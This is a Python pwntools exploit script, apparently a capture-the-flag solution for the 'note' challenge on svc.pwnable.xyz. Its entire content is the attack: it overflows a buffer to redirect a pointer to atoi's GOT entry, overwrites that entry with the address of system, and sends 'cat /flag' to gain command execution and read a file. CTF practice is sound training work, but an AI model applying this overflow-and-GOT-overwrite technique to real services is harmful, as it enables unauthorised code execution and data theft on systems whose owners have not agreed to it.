#!/usr/bin/env python3
from pwn import *
from sys import argv
import pwnlib; pwnlib.args.SILENT(True)

HOST = "svc.pwnable.xyz"
PORT = 30016
PATH = "./note"

reloc_atoi = 0x601268
system = 0x400756
p = remote(HOST, PORT) if(len(argv) > 1 and argv[1].lower() == "remote") else process(PATH)

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b"? ")
p.sendline(b"40")
p.recvuntil(b": ")
p.send(b'\xef\xbe\xad\xde'*8 + struct.pack('<Q', reloc_atoi))

p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(struct.pack('<Q', system))

p.recvuntil(b"> ")
p.sendline(b"cat /flag")
print(p.recv().decode())

if(hasattr(p, "kill")):
	p.kill()
else:
	p.close()
